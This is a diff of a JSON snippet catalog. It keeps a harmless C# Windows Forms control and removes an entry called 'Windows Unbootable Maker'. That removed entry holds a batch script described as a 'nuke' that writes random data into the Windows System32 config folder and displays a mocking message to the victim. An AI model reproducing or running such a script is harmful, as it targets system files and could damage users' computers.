@@ -233,14 +233,6 @@
       "lang": "csharp",
       "tags": ["C#", "Windows Forms", "Retro UI"],
       "code": "using System;\r\nusing System.Drawing;\r\nusing System.Drawing.Drawing2D;\r\nusing System.Windows.Forms;\r\n\r\nnamespace Winforms98\r\n{\r\n    public class Winforms98 : Control\r\n    {\r\n        public Winforms98()\r\n        {\r\n            InitializeComponent();\r\n        }\r\n\r\n        protected override void OnSizeChanged(EventArgs e) \r\n        { \r\n            using (GraphicsPath path = new GraphicsPath()) \r\n            { \r\n                path.AddRectangle(new Rectangle(0, 0, this.Width, this.Height));\r\n                this.Region = new Region(path);    \r\n            }\r\n        }\r\n    }\r\n}"
-    },
-    {
-      "id": "windows-unbootable-maker",
-      "name": "Windows Unbootable Maker",
-      "desc": "Make your Windows unbootable with this simple nuke script.",
-      "lang": "batch",
-      "tags": ["Batch", "Windows", "System", "Nuke"],
-      "code": "@echo off\r\n:: WARNING: This is not a joke batch file. It will may harm your PC, but it will create a bomb file in the Windows config folder and display a message. Use at your own risk.\r\n:: NOTE: THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY THIS FILE. USE AT YOUR OWN RISK.\r\ncd C:\\Windows\\System32\\config\r\necho %random%%random% >> OSDATA\r\necho Hi :D! %username% Such a bad news that your PC got Ducked! XD\r\npause >nul"
     }
   ],
   "websites": [
